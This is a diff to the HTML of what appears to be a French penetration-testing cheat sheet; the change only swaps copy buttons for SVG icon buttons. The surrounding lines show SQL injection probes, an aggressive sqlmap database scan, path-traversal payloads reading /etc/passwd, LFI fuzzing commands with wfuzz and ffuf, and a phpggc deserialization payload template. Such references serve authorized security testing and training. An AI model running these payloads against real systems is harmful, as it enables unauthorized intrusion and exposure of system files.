@@ -13,7 +13,6 @@
         <div class="cmd-item">
             <div class="code-block no-highlight">
                 <code>' ou %27 ou "  ou ') ou ')) ou '-- - ou %2D%2D%20%2D</code>
-                <button class="btn-copy"> </button>
             </div>
             <p class="cmd-description">Provoquer une erreur de syntaxe ou un bypass de login</p>
         </div>
@@ -21,7 +20,6 @@
         <div class="cmd-item">
             <div class="code-block no-highlight">
                 <code>' AND 1=1-- -  et  ' AND 1=2-- -</code>
-                <button class="btn-copy"> </button>
             </div>
             <p class="cmd-description">Vérifier si le contenu de la page change (SQLi aveugle)</p>
         </div>
@@ -29,7 +27,6 @@
         <div class="cmd-item">
             <div class="code-block no-highlight">
                 <code>' OR SLEEP(5)-- -</code>
-                <button class="btn-copy"> </button>
             </div>
             <p class="cmd-description">Détection par délai (MySQL/MariaDB). Si réponse > 5s -> vulnérable</p>
         </div>
@@ -50,7 +47,12 @@
         <div class="cmd-item">
             <div class="code-block">
                 <code>sqlmap -u "URL?id=1" --batch --risk 3 --level 5 --dbs</code>
-                <button class="btn-copy"> </button>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
             </div>
             <p class="cmd-description">Scan agressif si le scan de base ne trouve rien</p>
         </div>
@@ -127,7 +129,12 @@
         <div class="cmd-item">
             <div class="code-block no-highlight">
                 <code>..%2F..%2F..%2Fetc%2Fpasswd</code>
-                <button class="btn-copy"></button>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
             </div>
             <p class="cmd-description">Bypass via URL Encoding (..%2F = ../)</p>
         </div>
@@ -135,7 +142,12 @@
         <div class="cmd-item">
             <div class="code-block no-highlight">
                 <code>..%252f..%252f..%252fetc%252fpasswd</code>
-                <button class="btn-copy"></button>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
             </div>
             <p class="cmd-description">Double encodage (si le serveur décode deux fois)</p>
         </div>
@@ -143,7 +155,12 @@
         <div class="cmd-item">
             <div class="code-block">
                 <code>wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh [SIZE] "URL?path=../../../../../../FUZZ"</code>
-                <button class="btn-copy"></button>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
             </div>
             <p class="cmd-description">Wfuzz : --hh cache les réponses de taille identique à la page d'erreur</p>
         </div>
@@ -151,7 +168,12 @@
         <div class="cmd-item">
             <div class="code-block">
                 <code>ffuf -u "URL?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:"</code>
-                <button class="btn-copy"></button>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
             </div>
             <p class="cmd-description">Ffuf : -mr "root:x:" valide l'accès réel au fichier passwd sous Linux</p>
         </div>
@@ -471,7 +493,12 @@
         <div class="cmd-item">
             <div class="code-block">
                 <code>phpggc <span class="variable" data-var="gadget">GADGET_CHAIN</span> <span class="variable" data-var="func">FUNCTION</span> <span class="variable" data-var="cmd">COMMAND</span></code>
-                <button class="btn-copy"> </button>
+                <button class="btn-copy" title="Copier la commande">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                </button>
             </div>
             <p class="cmd-description">Génération de payload pour PHP (si la version/framework est connu)</p>
         </div>
